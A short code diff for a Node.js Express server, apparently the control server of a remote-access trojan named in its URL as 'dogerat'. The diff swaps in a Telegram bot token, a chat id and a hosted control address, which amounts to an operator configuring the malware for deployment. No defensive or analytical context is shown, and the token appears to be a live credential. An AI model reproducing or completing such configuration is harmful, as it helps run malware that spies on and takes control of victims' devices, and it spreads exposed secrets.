@@ -7,9 +7,9 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '5376895931:AAGungqejutol8QIidI2tlJMkmCSUuAAY9w'
-const id = '5155109916'
-const address = 'https://www.google.com'
+const token = '7273643824:AAGyE3fxWXZ3TjvI5NRJHW7MP-GXn6O3d8g'
+const id = '7192045592'
+const address = 'https://dogerat-us3b.onrender.com'
 
 const app = express();
 const appServer = http.createServer(app);
